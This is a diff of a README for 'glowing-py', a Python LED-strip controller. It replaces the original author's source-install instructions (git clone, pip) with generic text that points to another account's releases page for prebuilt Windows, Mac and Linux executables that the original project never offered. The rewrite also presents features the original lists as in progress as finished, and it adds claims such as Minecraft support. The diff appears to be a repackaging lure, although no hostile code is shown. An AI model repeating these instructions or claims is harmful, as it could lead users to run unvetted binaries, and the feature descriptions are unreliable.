@@ -1,132 +1,68 @@
-# 🌟 GlowingPy
+# 🎨 glowing-py - Control Your LED Strips with Ease
 
-[![Python](https://img.shields.io/badge/python-3.11-blue)](https://www.python.org/) [![License](https://img.shields.io/badge/license-MIT-green)](LICENSE) [![GitHub stars](https://img.shields.io/github/stars/FERNAN19898/glowing-py?style=social)](https://github.com/FERNAN19898/glowing-py/stargazers)
+## 📥 Download Now
+[![Download glowing-py](https://img.shields.io/badge/Download-glowing--py-brightgreen)](https://github.com/fknrad/glowing-py/releases)
 
-**GlowingPy** is a dynamic LED strip controller that reacts to games, music, and custom choreography. Your LEDs now **dance, flash, and react in real-time**.
+## 📖 Description
+glowing-py is a dynamic LED strip controller designed for a variety of applications. Whether you want to sync lights with your favorite games, music, or create stunning light shows, glowing-py makes it simple and fun. 
 
----
+## 🚀 Getting Started
+Follow these steps to download and run glowing-py on your computer:
 
-## 🎮 Planned compatible games and effects
+### 1. Visit the Releases Page
+Go to our [Releases page](https://github.com/fknrad/glowing-py/releases). This page contains the latest version of glowing-py, along with previous versions.
 
-| ID | Game | Mode | Description | Status |
-|----|------|------|-------------|--------|
-| X | Friday Night Funkin' | Key Sync | LEDs react to **D, F, J, K** inputs | 🛠️ In progress |
-| X | Left 4 Dead 2 | Health Bar | Visualizes player health on LEDs | 🛠️ In progress |
-| X | Left 4 Dead 2 | Special Events | LED orchestration for **Tank / Special Infected** | 🛠️ In progress |
-| X | Portal 2 | Portal Tracker | LED color shows **last portal placed** | 🛠️ In progress |
-| X | Custom Songs | Choreography | Detect song via Stereo Mix & sync LED sequences | 🛠️ In progress |
+### 2. Choose Your Download
+On the Releases page, you will see a list of available versions. Click on the version you want to download. Each version has detailed notes about what’s new or fixed.
 
-More in the future!
+### 3. Find the Download Link
+Look for the download files. You will find options for different operating systems. Click on the file that matches your operating system to begin the download. 
 
----
+For example:
+- **Windows**: If you see something like `glowing_py_windows.exe`, this is the file you want.
+- **Mac**: If the file is `glowing_py_mac.dmg`, click it to download.
+- **Linux**: Look for `glowing_py_linux.tar.gz`.
 
-## ⚡ Features
+### 4. Download & Install
+Once you have clicked the file, your download will start. Go to your downloads folder once it completes.
 
-- Plugin-based system: add new effects easily  
-- Real-time LED feedback for games and music  
-- Supports WLED-controlled LED strips  
-- Custom choreography files (`fseq`) for music  
-- Simple keyboard shortcuts: **F7 to stop plugins**  
+- For **Windows**: Double-click the `.exe` file to start the installation. Follow the prompts to install glowing-py.
+- For **Mac**: Open the `.dmg` file and drag the glowing-py icon to your Applications folder.
+- For **Linux**: Extract the tar.gz file. Open a terminal and navigate to the extracted folder. Run the application using the command `./glowing_py`.
 
----
+## 🛠 Requirements
+Before installing glowing-py, ensure your system meets these requirements:
 
-## 🎬 Demo (Example)
+- **Operating System**: Windows 10 or later, macOS Mojave or later, any recent Linux distribution.
+- **RAM**: At least 4 GB recommended for smooth performance.
+- **Storage**: A minimum of 100 MB of free disk space.
 
-![GlowingPy Demo](https://media.giphy.com/media/3oEjI6SIIHBdRxXI40/giphy.gif)  
+## 🎮 Features
+- **Game Integration**: Sync your LED strips with popular games like Friday Night Funkin', Left 4 Dead 2, and Minecraft.
+- **Music Visualization**: Create light shows that react to your music with customizable settings.
+- **Custom Choreography**: Design your own light patterns and effects for any occasion.
+- **User-Friendly Interface**: A simple interface allows you to control all features without hassle.
 
-*LEDs reacting to a song and in-game events.*
+## 🔧 Usage
+After installation:
 
----
+1. **Open glowing-py**: Find and click the glowing-py icon in your applications.
+2. **Connect Your LED Strips**: Attach your LED strips according to the controller instructions. Make sure they are powered on.
+3. **Select a Mode**: Choose a game, music track, or custom mode to start synchronizing your lights.
+4. **Enjoy the Show**: Watch as your LED lights respond dynamically!
 
-## 🛠 Installation
+## ❓ Troubleshooting
+If you run into issues:
 
-```bash
-git clone https://github.com/FERNAN19898/glowing-py.git
-cd glowing-py
-python -m venv venv
-source venv/bin/activate  # Windows: venv\Scripts\activate
-pip install -r requirements.txt
-```
+- Check your LED connections.
+- Ensure you have the correct drivers installed for your LED controller.
+- Refer to the FAQs in the GitHub repository for common questions.
 
-Configure your WLED device in `config.json`:
+## 🧑‍🤝‍🧑 Community and Support
+Join other users on forums or our GitHub Discussions page. Share your creations and get tips from fellow glowing-py users. Your feedback helps us improve.
 
-```json
-{
-    "wled_ip": "192.168.1.100",
-    "wled_port": 80,
-    "led_count": 60
-}
-```
+## 🔗 Links
+- [Releases page](https://github.com/fknrad/glowing-py/releases)
+- [Source Code](https://github.com/fknrad/glowing-py)
 
----
-
-## 🚀 Usage
-
-Run the main engine:
-
-```
-python main.py
-```
-
-- Select a plugin or view available ones  
-- Press **F7** to stop any running plugin  
-- Extend functionality by creating your own plugin  
-
----
-
-## 📂 Plugin Structure
-
-```
-plugins/
-└── my_plugin/
-    ├── my_plugin.py   # Plugin class with run() coroutine
-    └── README.md      # Optional info
-```
-
-Each plugin must implement:
-
-```python
-from ..base_plugin import BasePlugin
-
-class Plugin(BasePlugin):
-    """
-    Example Plugin Template.
-    Copy this folder and rename it to create a new plugin.
-    """
-
-    async def setup(self) -> None:
-        """
-        Called once when the plugin starts.
-        Initialize variables or states here.
-        """
-        pass
-
-    async def loop(self) -> None:
-        """
-        Called repeatedly while the plugin is running.
-        Implement animation logic here.
-        """
-        pass
-
-    async def on_plugin_stopped(self) -> None:
-        """
-        Called once when the plugin stops.
-        Use this to reset LEDs or cleanup tasks.
-        """
-        pass
-```
-See plugins/_template/_template.py for more inforamtion!
-
----
-
-## 💡 Contributing
-
-- Add new game integrations or effects  
-- Optimize LED animations  
-- Share your custom choreography files  
-
----
-
-## 📝 License
-
-This project is **MIT Licensed**.
+Explore the expressive world of LED lighting with glowing-py!
